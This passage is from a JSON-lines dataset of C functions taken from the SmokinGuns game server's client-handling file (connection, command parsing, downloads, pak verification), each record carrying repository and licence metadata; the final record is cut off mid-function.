{"docstring": "/*\n==================\nSV_Voip_f\n==================\n*/\n", "func_signal": "static void SV_Voip_f( client_t *cl )", "code": "{\n\tconst char *cmd = Cmd_Argv(1);\n\tif (strcmp(cmd, \"ignore\") == 0) {\n\t\tSV_UpdateVoipIgnore(cl, Cmd_Argv(2), qtrue);\n\t} else if (strcmp(cmd, \"unignore\") == 0) {\n\t\tSV_UpdateVoipIgnore(cl, Cmd_Argv(2), qfalse);\n\t} else if (strcmp(cmd, \"muteall\") == 0) {\n\t\tcl->muteAllVoip = qtrue;\n\t} else if (strcmp(cmd, \"unmuteall\") == 0) {\n\t\tcl->muteAllVoip = qfalse;\n\t}\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n=====================\nSV_DropClient\n\nCalled when the player is totally leaving the server, either willingly\nor unwillingly.  This is NOT called if the entire server is quiting\nor crashing -- SV_FinalMessage() will handle that\n=====================\n*/\n", "func_signal": "void SV_DropClient( client_t *drop, const char *reason )", "code": "{\n\tint\t\ti;\n\tchallenge_t\t*challenge;\n\tconst qboolean isBot = drop->netchan.remoteAddress.type == NA_BOT;\n\n\tif ( drop->state == CS_ZOMBIE ) {\n\t\treturn;\t\t// already dropped\n\t}\n\n\tif ( !isBot ) {\n\t\t// see if we already have a challenge for this ip\n\t\tchallenge = &svs.challenges[0];\n\n\t\tfor (i = 0 ; i < MAX_CHALLENGES ; i++, challenge++)\n\t\t{\n\t\t\tif(NET_CompareAdr(drop->netchan.remoteAddress, challenge->adr))\n\t\t\t{\n\t\t\t\tCom_Memset(challenge, 0, sizeof(*challenge));\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\t// Free all allocated data on the client structure\n\tSV_FreeClient(drop);\n\n\t// tell everyone why they got dropped\n\tSV_SendServerCommand( NULL, \"print \\\"%s\" S_COLOR_WHITE \" %s\\n\\\"\", drop->name, reason );\n\n\t// call the prog function for removing a client\n\t// this will remove the body, among other things\n\tVM_Call( gvm, GAME_CLIENT_DISCONNECT, drop - svs.clients );\n\n\t// add the disconnect command\n\tSV_SendServerCommand( drop, \"disconnect \\\"%s\\\"\", reason);\n\n\tif ( isBot ) {\n\t\tSV_BotFreeClient( drop - svs.clients );\n\t}\n\n\t// nuke user info\n\tSV_SetUserinfo( drop - svs.clients, \"\" );\n\t\n\tif ( isBot ) {\n\t\t// bots shouldn't go zombie, as there's no real net connection.\n\t\tdrop->state = CS_FREE;\n\t} else {\n\t\tCom_DPrintf( \"Going to CS_ZOMBIE for %s\\n\", drop->name );\n\t\tdrop->state = CS_ZOMBIE;\t\t// become free in a few seconds\n\t}\n\n\t// if this was the last client on the server, send a heartbeat\n\t// to the master so it is known the server is empty\n\t// send a heartbeat now so the master will get up to date info\n\t// if there is already a slot for this ip, reuse it\n\tfor (i=0 ; i < sv_maxclients->integer ; i++ ) {\n\t\tif ( svs.clients[i].state >= CS_CONNECTED ) {\n\t\t\tbreak;\n\t\t}\n\t}\n\tif ( i == sv_maxclients->integer ) {\n\t\tSV_Heartbeat_f();\n\t}\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n=================\nSV_ResetPureClient_f\n=================\n*/\n", "func_signal": "static void SV_ResetPureClient_f( client_t *cl )", "code": "{\n\tcl->pureAuthentic = 0;\n\tcl->gotCP = qfalse;\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n=====================\nSV_FreeClient\n\nDestructor for data allocated in a client structure\n=====================\n*/\n", "func_signal": "void SV_FreeClient(client_t *client)", "code": "{\n#ifdef USE_VOIP\n\tint index;\n\t\n\tfor(index = client->queuedVoipIndex; index < client->queuedVoipPackets; index++)\n\t{\n\t\tindex %= ARRAY_LEN(client->voipPacket);\n\t\t\n\t\tZ_Free(client->voipPacket[index]);\n\t}\n\t\n\tclient->queuedVoipPackets = 0;\n#endif\n\n\tSV_Netchan_FreeQueue(client);\n\tSV_CloseDownload(client);\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n===============\nSV_ClientCommand\n===============\n*/\n", "func_signal": "static qboolean SV_ClientCommand( client_t *cl, msg_t *msg )", "code": "{\n\tint\t\tseq;\n\tconst char\t*s;\n\tqboolean clientOk = qtrue;\n\n\tseq = MSG_ReadLong( msg );\n\ts = MSG_ReadString( msg );\n\n\t// see if we have already executed it\n\tif ( cl->lastClientCommand >= seq ) {\n\t\treturn qtrue;\n\t}\n\n\tCom_DPrintf( \"clientCommand: %s : %i : %s\\n\", cl->name, seq, s );\n\n\t// drop the connection if we have somehow lost commands\n\tif ( seq > cl->lastClientCommand + 1 ) {\n\t\tCom_Printf( \"Client %s lost %i clientCommands\\n\", cl->name,\n\t\t\tseq - cl->lastClientCommand + 1 );\n\t\tSV_DropClient( cl, \"Lost reliable commands\" );\n\t\treturn qfalse;\n\t}\n\n\t// malicious users may try using too many string commands\n\t// to lag other players.  If we decide that we want to stall\n\t// the command, we will stop processing the rest of the packet,\n\t// including the usercmd.  This causes flooders to lag themselves\n\t// but not other people\n\t// We don't do this when the client hasn't been active yet since it's\n\t// normal to spam a lot of commands when downloading\n\tif ( !com_cl_running->integer &&\n\t\tcl->state >= CS_ACTIVE &&\n\t\tsv_floodProtect->integer &&\n\t\tsvs.time < cl->nextReliableTime ) {\n\t\t// ignore any other text messages from this client but let them keep playing\n\t\t// TTimo - moved the ignored verbose to the actual processing in SV_ExecuteClientCommand, only printing if the core doesn't intercept\n\t\tclientOk = qfalse;\n\t}\n\n\t// don't allow another command for one second\n\tcl->nextReliableTime = svs.time + 1000;\n\n\tSV_ExecuteClientCommand( cl, s, clientOk );\n\n\tcl->lastClientCommand = seq;\n\tCom_sprintf(cl->lastClientCommandString, sizeof(cl->lastClientCommandString), \"%s\", s);\n\n\treturn qtrue;\t\t// continue procesing\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n===================\nSV_ExecuteClientMessage\n\nParse a client packet\n===================\n*/\n", "func_signal": "void SV_ExecuteClientMessage( client_t *cl, msg_t *msg )", "code": "{\n\tint\t\t\tc;\n\tint\t\t\tserverId;\n\n\tMSG_Bitstream(msg);\n\n\tserverId = MSG_ReadLong( msg );\n\tcl->messageAcknowledge = MSG_ReadLong( msg );\n\n\tif (cl->messageAcknowledge < 0) {\n\t\t// usually only hackers create messages like this\n\t\t// it is more annoying for them to let them hanging\n#ifndef NDEBUG\n\t\tSV_DropClient( cl, \"DEBUG: illegible client message\" );\n#endif\n\t\treturn;\n\t}\n\n\tcl->reliableAcknowledge = MSG_ReadLong( msg );\n\n\t// NOTE: when the client message is fux0red the acknowledgement numbers\n\t// can be out of range, this could cause the server to send thousands of server\n\t// commands which the server thinks are not yet acknowledged in SV_UpdateServerCommandsToClient\n\tif (cl->reliableAcknowledge < cl->reliableSequence - MAX_RELIABLE_COMMANDS) {\n\t\t// usually only hackers create messages like this\n\t\t// it is more annoying for them to let them hanging\n#ifndef NDEBUG\n\t\tSV_DropClient( cl, \"DEBUG: illegible client message\" );\n#endif\n\t\tcl->reliableAcknowledge = cl->reliableSequence;\n\t\treturn;\n\t}\n\t// if this is a usercmd from a previous gamestate,\n\t// ignore it or retransmit the current gamestate\n\t//\n\t// if the client was downloading, let it stay at whatever serverId and\n\t// gamestate it was at.  This allows it to keep downloading even when\n\t// the gamestate changes.  After the download is finished, we'll\n\t// notice and send it a new game state\n\t//\n\t// https://zerowing.idsoftware.com/bugzilla/show_bug.cgi?id=536\n\t// don't drop as long as previous command was a nextdl, after a dl is done, downloadName is set back to \"\"\n\t// but we still need to read the next message to move to next download or send gamestate\n\t// I don't like this hack though, it must have been working fine at some point, suspecting the fix is somewhere else\n\tif ( serverId != sv.serverId && !*cl->downloadName && !strstr(cl->lastClientCommandString, \"nextdl\") ) {\n\t\tif ( serverId >= sv.restartedServerId && serverId < sv.serverId ) { // TTimo - use a comparison here to catch multiple map_restart\n\t\t\t// they just haven't caught the map_restart yet\n\t\t\tCom_DPrintf(\"%s : ignoring pre map_restart / outdated client message\\n\", cl->name);\n\t\t\treturn;\n\t\t}\n\t\t// if we can tell that the client has dropped the last\n\t\t// gamestate we sent them, resend it\n\t\tif ( cl->messageAcknowledge > cl->gamestateMessageNum ) {\n\t\t\tCom_DPrintf( \"%s : dropped gamestate, resending\\n\", cl->name );\n\t\t\tSV_SendClientGameState( cl );\n\t\t}\n\t\treturn;\n\t}\n\n\t// this client has acknowledged the new gamestate so it's\n\t// safe to start sending it the real time again\n\tif( cl->oldServerTime && serverId == sv.serverId ){\n\t\tCom_DPrintf( \"%s acknowledged gamestate\\n\", cl->name );\n\t\tcl->oldServerTime = 0;\n\t}\n\n\t// read optional clientCommand strings\n\tdo {\n\t\tc = MSG_ReadByte( msg );\n\n\t\tif ( c == clc_EOF ) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif ( c != clc_clientCommand ) {\n\t\t\tbreak;\n\t\t}\n\t\tif ( !SV_ClientCommand( cl, msg ) ) {\n\t\t\treturn;\t// we couldn't execute it because of the flood protection\n\t\t}\n\t\tif (cl->state == CS_ZOMBIE) {\n\t\t\treturn;\t// disconnect command\n\t\t}\n\t} while ( 1 );\n\n\t// read optional voip data\n\tif ( c == clc_voip ) {\n#ifdef USE_VOIP\n\t\tSV_UserVoip( cl, msg );\n\t\tc = MSG_ReadByte( msg );\n#endif\n\t}\n\n\t// read the usercmd_t\n\tif ( c == clc_move ) {\n\t\tSV_UserMove( cl, msg, qtrue );\n\t} else if ( c == clc_moveNoDelta ) {\n\t\tSV_UserMove( cl, msg, qfalse );\n\t} else if ( c != clc_EOF ) {\n\t\tCom_Printf( \"WARNING: bad command byte for client %i\\n\", (int) (cl - svs.clients) );\n\t}\n//\tif ( msg->readcount != msg->cursize ) {\n//\t\tCom_Printf( \"WARNING: Junk at end of packet for client %i\\n\", cl - svs.clients );\n//\t}\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_DirectConnect\n\nA \"connect\" OOB command has been received\n==================\n*/\n", "func_signal": "void SV_DirectConnect( netadr_t from )", "code": "{\n\tchar\t\tuserinfo[MAX_INFO_STRING];\n\tint\t\t\ti;\n\tclient_t\t*cl, *newcl;\n\tclient_t\ttemp;\n\tsharedEntity_t *ent;\n\tint\t\t\tclientNum;\n\tint\t\t\tversion;\n\tint\t\t\tqport;\n\tint\t\t\tchallenge;\n\tchar\t\t*password;\n\tint\t\t\tstartIndex;\n\tintptr_t\tdenied;\n\tint\t\t\tcount;\n\tchar\t\t*ip;\n#ifdef LEGACY_PROTOCOL\n\tqboolean\tcompat = qfalse;\n#endif\n\n\tCom_DPrintf (\"SVC_DirectConnect ()\\n\");\n\n\t// Check whether this client is banned.\n\tif(SV_IsBanned(&from, qfalse))\n\t{\n\t\tNET_OutOfBandPrint(NS_SERVER, from, \"print\\nYou are banned from this server.\\n\");\n\t\treturn;\n\t}\n\n\tQ_strncpyz( userinfo, Cmd_Argv(1), sizeof(userinfo) );\n\n\tversion = atoi(Info_ValueForKey(userinfo, \"protocol\"));\n\t\n#ifdef LEGACY_PROTOCOL\n\tif(version > 0 && com_legacyprotocol->integer == version)\n\t\tcompat = qtrue;\n\telse\n#endif\n\t{\n\t\tif(version != com_protocol->integer)\n\t\t{\n\t\t\tNET_OutOfBandPrint(NS_SERVER, from, \"print\\nServer uses protocol version %i \"\n\t\t\t\t\t   \"(yours is %i).\\n\", com_protocol->integer, version);\n\t\t\tCom_DPrintf(\"    rejected connect from version %i\\n\", version);\n\t\t\treturn;\n\t\t}\n\t}\n\n\tchallenge = atoi( Info_ValueForKey( userinfo, \"challenge\" ) );\n\tqport = atoi( Info_ValueForKey( userinfo, \"qport\" ) );\n\n\t// quick reject\n\tfor (i=0,cl=svs.clients ; i < sv_maxclients->integer ; i++,cl++) {\n\t\tif ( cl->state == CS_FREE ) {\n\t\t\tcontinue;\n\t\t}\n\t\tif ( NET_CompareBaseAdr( from, cl->netchan.remoteAddress )\n\t\t\t&& ( cl->netchan.qport == qport\n\t\t\t|| from.port == cl->netchan.remoteAddress.port ) ) {\n\t\t\tif (( svs.time - cl->lastConnectTime)\n\t\t\t\t< (sv_reconnectlimit->integer * 1000)) {\n\t\t\t\tCom_DPrintf (\"%s:reconnect rejected : too soon\\n\", NET_AdrToString (from));\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// don't let \"ip\" overflow userinfo string\n\tif ( NET_IsLocalAddress (from) )\n\t\tip = \"localhost\";\n\telse\n\t\tip = (char *)NET_AdrToString( from );\n\tif( ( strlen( ip ) + strlen( userinfo ) + 4 ) >= MAX_INFO_STRING ) {\n\t\tNET_OutOfBandPrint( NS_SERVER, from,\n\t\t\t\"print\\nUserinfo string length exceeded.  \"\n\t\t\t\"Try removing setu cvars from your config.\\n\" );\n\t\treturn;\n\t}\n\tInfo_SetValueForKey( userinfo, \"ip\", ip );\n\n\t// see if the challenge is valid (LAN clients don't need to challenge)\n\tif (!NET_IsLocalAddress(from))\n\t{\n\t\tint ping;\n\t\tchallenge_t *challengeptr;\n\n\t\tfor (i=0; i<MAX_CHALLENGES; i++)\n\t\t{\n\t\t\tif (NET_CompareAdr(from, svs.challenges[i].adr))\n\t\t\t{\n\t\t\t\tif(challenge == svs.challenges[i].challenge)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tif (i == MAX_CHALLENGES)\n\t\t{\n\t\t\tNET_OutOfBandPrint( NS_SERVER, from, \"print\\nNo or bad challenge for your address.\\n\" );\n\t\t\treturn;\n\t\t}\n\t\n\t\tchallengeptr = &svs.challenges[i];\n\t\t\n\t\tif(challengeptr->wasrefused)\n\t\t{\n\t\t\t// Return silently, so that error messages written by the server keep being displayed.\n\t\t\treturn;\n\t\t}\n\n\t\tping = svs.time - challengeptr->pingTime;\n\n\t\t// never reject a LAN client based on ping\n\t\tif ( !Sys_IsLANAddress( from ) ) {\n\t\t\tif ( sv_minPing->value && ping < sv_minPing->value ) {\n\t\t\t\tNET_OutOfBandPrint( NS_SERVER, from, \"print\\nServer is for high pings only\\n\" );\n\t\t\t\tCom_DPrintf (\"Client %i rejected on a too low ping\\n\", i);\n\t\t\t\tchallengeptr->wasrefused = qtrue;\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif ( sv_maxPing->value && ping > sv_maxPing->value ) {\n\t\t\t\tNET_OutOfBandPrint( NS_SERVER, from, \"print\\nServer is for low pings only\\n\" );\n\t\t\t\tCom_DPrintf (\"Client %i rejected on a too high ping\\n\", i);\n\t\t\t\tchallengeptr->wasrefused = qtrue;\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tCom_Printf(\"Client %i connecting with %i challenge ping\\n\", i, ping);\n\t\tchallengeptr->connected = qtrue;\n\t}\n\n\tnewcl = &temp;\n\tCom_Memset (newcl, 0, sizeof(client_t));\n\n\t// if there is already a slot for this ip, reuse it\n\tfor (i=0,cl=svs.clients ; i < sv_maxclients->integer ; i++,cl++) {\n\t\tif ( cl->state == CS_FREE ) {\n\t\t\tcontinue;\n\t\t}\n\t\tif ( NET_CompareBaseAdr( from, cl->netchan.remoteAddress )\n\t\t\t&& ( cl->netchan.qport == qport\n\t\t\t|| from.port == cl->netchan.remoteAddress.port ) ) {\n\t\t\tCom_Printf (\"%s:reconnect\\n\", NET_AdrToString (from));\n\t\t\tnewcl = cl;\n\n\t\t\t// this doesn't work because it nukes the players userinfo\n\n//\t\t\t// disconnect the client from the game first so any flags the\n//\t\t\t// player might have are dropped\n//\t\t\tVM_Call( gvm, GAME_CLIENT_DISCONNECT, newcl - svs.clients );\n\t\t\t//\n\t\t\tgoto gotnewcl;\n\t\t}\n\t}\n\n\t// find a client slot\n\t// if \"sv_privateClients\" is set > 0, then that number\n\t// of client slots will be reserved for connections that\n\t// have \"password\" set to the value of \"sv_privatePassword\"\n\t// Info requests will report the maxclients as if the private\n\t// slots didn't exist, to prevent people from trying to connect\n\t// to a full server.\n\t// This is to allow us to reserve a couple slots here on our\n\t// servers so we can play without having to kick people.\n\n\t// check for privateClient password\n\tpassword = Info_ValueForKey( userinfo, \"password\" );\n\tif ( !strcmp( password, sv_privatePassword->string ) ) {\n\t\tstartIndex = 0;\n\t} else {\n\t\t// skip past the reserved slots\n\t\tstartIndex = sv_privateClients->integer;\n\t}\n\n\tnewcl = NULL;\n\tfor ( i = startIndex; i < sv_maxclients->integer ; i++ ) {\n\t\tcl = &svs.clients[i];\n\t\tif (cl->state == CS_FREE) {\n\t\t\tnewcl = cl;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif ( !newcl ) {\n\t\tif ( NET_IsLocalAddress( from ) ) {\n\t\t\tcount = 0;\n\t\t\tfor ( i = startIndex; i < sv_maxclients->integer ; i++ ) {\n\t\t\t\tcl = &svs.clients[i];\n\t\t\t\tif (cl->netchan.remoteAddress.type == NA_BOT) {\n\t\t\t\t\tcount++;\n\t\t\t\t}\n\t\t\t}\n\t\t\t// if they're all bots\n\t\t\tif (count >= sv_maxclients->integer - startIndex) {\n\t\t\t\tSV_DropClient(&svs.clients[sv_maxclients->integer - 1], \"only bots on server\");\n\t\t\t\tnewcl = &svs.clients[sv_maxclients->integer - 1];\n\t\t\t}\n\t\t\telse {\n\t\t\t\tCom_Error( ERR_FATAL, \"server is full on local connect\" );\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tNET_OutOfBandPrint( NS_SERVER, from, \"print\\nServer is full.\\n\" );\n\t\t\tCom_DPrintf (\"Rejected a connection.\\n\");\n\t\t\treturn;\n\t\t}\n\t}\n\n\t// we got a newcl, so reset the reliableSequence and reliableAcknowledge\n\tcl->reliableAcknowledge = 0;\n\tcl->reliableSequence = 0;\n\ngotnewcl:\n\t// build a new connection\n\t// accept the new client\n\t// this is the only place a client_t is ever initialized\n\t*newcl = temp;\n\tclientNum = newcl - svs.clients;\n\tent = SV_GentityNum( clientNum );\n\tnewcl->gentity = ent;\n\n\t// save the challenge\n\tnewcl->challenge = challenge;\n\n\t// save the address\n#ifdef LEGACY_PROTOCOL\n\tnewcl->compat = compat;\n\tNetchan_Setup(NS_SERVER, &newcl->netchan, from, qport, challenge, compat);\n#else\n\tNetchan_Setup(NS_SERVER, &newcl->netchan, from, qport, challenge, qfalse);\n#endif\n\t// init the netchan queue\n\tnewcl->netchan_end_queue = &newcl->netchan_start_queue;\n\n\t// save the userinfo\n\tQ_strncpyz( newcl->userinfo, userinfo, sizeof(newcl->userinfo) );\n\n\t// get the game a chance to reject this connection or modify the userinfo\n\tdenied = VM_Call( gvm, GAME_CLIENT_CONNECT, clientNum, qtrue, qfalse ); // firstTime = qtrue\n\tif ( denied ) {\n\t\t// we can't just use VM_ArgPtr, because that is only valid inside a VM_Call\n\t\tchar *str = VM_ExplicitArgPtr( gvm, denied );\n\n\t\tNET_OutOfBandPrint( NS_SERVER, from, \"print\\n%s\\n\", str );\n\t\tCom_DPrintf (\"Game rejected a connection: %s.\\n\", str);\n\t\treturn;\n\t}\n\n#ifdef SMOKINGUNS\n\t// Tequila comment: Trusted client should present a valid GUID, but only IPV4 clients are supported for now\n\tif (from.type == NA_IP && !Sys_IsLANAddress(from) && !SV_TrustedClient( ip, userinfo )) {\n\t\tNET_OutOfBandPrint( NS_SERVER, from, \"print\\nThis server only accepts trusted clients.\\n\" );\n\t\tCom_Printf(\"We rejected an untrusted client\\n\");\n\t\treturn;\n\t}\n#endif\n\n\tSV_UserinfoChanged( newcl );\n\n\t// send the connect packet to the client\n\tNET_OutOfBandPrint(NS_SERVER, from, \"connectResponse %d\", challenge);\n\n\tCom_DPrintf( \"Going from CS_FREE to CS_CONNECTED for %s\\n\", newcl->name );\n\n\tnewcl->state = CS_CONNECTED;\n\tnewcl->lastSnapshotTime = 0;\n\tnewcl->lastPacketTime = svs.time;\n\tnewcl->lastConnectTime = svs.time;\n\n\t// when we receive the first packet from the client, we will\n\t// notice that it is from a different serverid and that the\n\t// gamestate message was not just sent, forcing a retransmit\n\tnewcl->gamestateMessageNum = -1;\n\n\t// if this was the first client on the server, or the last client\n\t// the server can hold, send a heartbeat to the master.\n\tcount = 0;\n\tfor (i=0,cl=svs.clients ; i < sv_maxclients->integer ; i++,cl++) {\n\t\tif ( svs.clients[i].state >= CS_CONNECTED ) {\n\t\t\tcount++;\n\t\t}\n\t}\n\tif ( count == 1 || count == sv_maxclients->integer ) {\n\t\tSV_Heartbeat_f();\n\t}\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_NextDownload_f\n\nThe argument will be the last acknowledged block from the client, it should be\nthe same as cl->downloadClientBlock\n==================\n*/\n", "func_signal": "static void SV_NextDownload_f( client_t *cl )", "code": "{\n\tint block = atoi( Cmd_Argv(1) );\n\n\tif (block == cl->downloadClientBlock) {\n\t\tCom_DPrintf( \"clientDownload: %d : client acknowledge of block %d\\n\", (int) (cl - svs.clients), block );\n\n\t\t// Find out if we are done.  A zero-length block indicates EOF\n\t\tif (cl->downloadBlockSize[cl->downloadClientBlock % MAX_DOWNLOAD_WINDOW] == 0) {\n\t\t\tCom_Printf( \"clientDownload: %d : file \\\"%s\\\" completed\\n\", (int) (cl - svs.clients), cl->downloadName );\n\t\t\tSV_CloseDownload( cl );\n\t\t\treturn;\n\t\t}\n\n\t\tcl->downloadSendTime = svs.time;\n\t\tcl->downloadClientBlock++;\n\t\treturn;\n\t}\n\t// We aren't getting an acknowledge for the correct block, drop the client\n\t// FIXME: this is bad... the client will never parse the disconnect message\n\t//\t\t\tbecause the cgame isn't loaded yet\n\tSV_DropClient( cl, \"broken download\" );\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_ShouldIgnoreVoipSender\n\nBlocking of voip packets based on source client\n==================\n*/\n", "func_signal": "static qboolean SV_ShouldIgnoreVoipSender(const client_t *cl)", "code": "{\n\tif (!sv_voip->integer)\n\t\treturn qtrue;  // VoIP disabled on this server.\n\telse if (!cl->hasVoip)  // client doesn't have VoIP support?!\n\t\treturn qtrue;\n    \n\t// !!! FIXME: implement player blacklist.\n\n\treturn qfalse;  // don't ignore.\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_StopDownload_f\n\nAbort a download if in progress\n==================\n*/\n", "func_signal": "static void SV_StopDownload_f( client_t *cl )", "code": "{\n\tif (*cl->downloadName)\n\t\tCom_DPrintf( \"clientDownload: %d : file \\\"%s\\\" aborted\\n\", (int) (cl - svs.clients), cl->downloadName );\n\n\tSV_CloseDownload( cl );\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_ClientEnterWorld\n==================\n*/\n", "func_signal": "void SV_ClientEnterWorld( client_t *client, usercmd_t *cmd )", "code": "{\n\tint\t\tclientNum;\n\tsharedEntity_t *ent;\n\n\tCom_DPrintf( \"Going from CS_PRIMED to CS_ACTIVE for %s\\n\", client->name );\n\tclient->state = CS_ACTIVE;\n\n\t// resend all configstrings using the cs commands since these are\n\t// no longer sent when the client is CS_PRIMED\n\tSV_UpdateConfigstrings( client );\n\n\t// set up the entity for the client\n\tclientNum = client - svs.clients;\n\tent = SV_GentityNum( clientNum );\n\tent->s.number = clientNum;\n\tclient->gentity = ent;\n\n\tclient->deltaMessage = -1;\n\tclient->lastSnapshotTime = 0;\t// generate a snapshot immediately\n\n\tif(cmd)\n\t\tmemcpy(&client->lastUsercmd, cmd, sizeof(client->lastUsercmd));\n\telse\n\t\tmemset(&client->lastUsercmd, '\\0', sizeof(client->lastUsercmd));\n\n\t// call the game begin function\n\tVM_Call( gvm, GAME_CLIENT_BEGIN, client - svs.clients );\n\n\tif (svs.initialized && sv_autorecord->integer && client->netchan.remoteAddress.type != NA_BOT) {\n\t\tCL_Record(client, NULL);\n\t}\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n=================\nSV_VerifyPaks_f\n\nIf we are pure, disconnect the client if they do no meet the following conditions:\n\n1. the first two checksums match our view of cgame and ui\n2. there are no any additional checksums that we do not have\n\nThis routine would be a bit simpler with a goto but i abstained\n\n=================\n*/\n", "func_signal": "static void SV_VerifyPaks_f( client_t *cl )", "code": "{\n\tint nChkSum1, nChkSum2, nClientPaks, nServerPaks, i, j, nCurArg;\n\tint nClientChkSum[1024];\n\tint nServerChkSum[1024];\n\tconst char *pPaks, *pArg;\n\tqboolean bGood = qtrue;\n\n\t// if we are pure, we \"expect\" the client to load certain things from\n\t// certain pk3 files, namely we want the client to have loaded the\n\t// ui and cgame that we think should be loaded based on the pure setting\n\t//\n\tif ( sv_pure->integer != 0 ) {\n\n\t\tnChkSum1 = nChkSum2 = 0;\n\t\t// we run the game, so determine which cgame and ui the client \"should\" be running\n\t\tbGood = (FS_FileIsInPAK(\"vm/cgame.qvm\", &nChkSum1) == 1);\n\t\tif (bGood)\n\t\t\tbGood = (FS_FileIsInPAK(\"vm/ui.qvm\", &nChkSum2) == 1);\n\n\t\tnClientPaks = Cmd_Argc();\n\n\t\t// start at arg 2 ( skip serverId cl_paks )\n\t\tnCurArg = 1;\n\n\t\tpArg = Cmd_Argv(nCurArg++);\n\t\tif(!pArg) {\n\t\t\tbGood = qfalse;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// https://zerowing.idsoftware.com/bugzilla/show_bug.cgi?id=475\n\t\t\t// we may get incoming cp sequences from a previous checksumFeed, which we need to ignore\n\t\t\t// since serverId is a frame count, it always goes up\n\t\t\tif (atoi(pArg) < sv.checksumFeedServerId)\n\t\t\t{\n\t\t\t\tCom_DPrintf(\"ignoring outdated cp command from client %s\\n\", cl->name);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\t// we basically use this while loop to avoid using 'goto' :)\n\t\twhile (bGood) {\n\n\t\t\t// must be at least 6: \"cl_paks cgame ui @ firstref ... numChecksums\"\n\t\t\t// numChecksums is encoded\n\t\t\tif (nClientPaks < 6) {\n\t\t\t\tbGood = qfalse;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t// verify first to be the cgame checksum\n\t\t\tpArg = Cmd_Argv(nCurArg++);\n\t\t\tif (!pArg || *pArg == '@' || atoi(pArg) != nChkSum1 ) {\n\t\t\t\tbGood = qfalse;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t// verify the second to be the ui checksum\n\t\t\tpArg = Cmd_Argv(nCurArg++);\n\t\t\tif (!pArg || *pArg == '@' || atoi(pArg) != nChkSum2 ) {\n\t\t\t\tbGood = qfalse;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t// should be sitting at the delimeter now\n\t\t\tpArg = Cmd_Argv(nCurArg++);\n\t\t\tif (*pArg != '@') {\n\t\t\t\tbGood = qfalse;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t// store checksums since tokenization is not re-entrant\n\t\t\tfor (i = 0; nCurArg < nClientPaks; i++) {\n\t\t\t\tnClientChkSum[i] = atoi(Cmd_Argv(nCurArg++));\n\t\t\t}\n\n\t\t\t// store number to compare against (minus one cause the last is the number of checksums)\n\t\t\tnClientPaks = i - 1;\n\n\t\t\t// make sure none of the client check sums are the same\n\t\t\t// so the client can't send 5 the same checksums\n\t\t\tfor (i = 0; i < nClientPaks; i++) {\n\t\t\t\tfor (j = 0; j < nClientPaks; j++) {\n\t\t\t\t\tif (i == j)\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\tif (nClientChkSum[i] == nClientChkSum[j]) {\n\t\t\t\t\t\tbGood = qfalse;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (bGood == qfalse)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (bGood == qfalse)\n\t\t\t\tbreak;\n\n\t\t\t// get the pure checksums of the pk3 files loaded by the server\n\t\t\tpPaks = FS_LoadedPakPureChecksums();\n\t\t\tCmd_TokenizeString( pPaks );\n\t\t\tnServerPaks = Cmd_Argc();\n\t\t\tif (nServerPaks > 1024)\n\t\t\t\tnServerPaks = 1024;\n\n\t\t\tfor (i = 0; i < nServerPaks; i++) {\n\t\t\t\tnServerChkSum[i] = atoi(Cmd_Argv(i));\n\t\t\t}\n\n\t\t\t// check if the client has provided any pure checksums of pk3 files not loaded by the server\n\t\t\tfor (i = 0; i < nClientPaks; i++) {\n\t\t\t\tfor (j = 0; j < nServerPaks; j++) {\n\t\t\t\t\tif (nClientChkSum[i] == nServerChkSum[j]) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (j >= nServerPaks) {\n\t\t\t\t\tbGood = 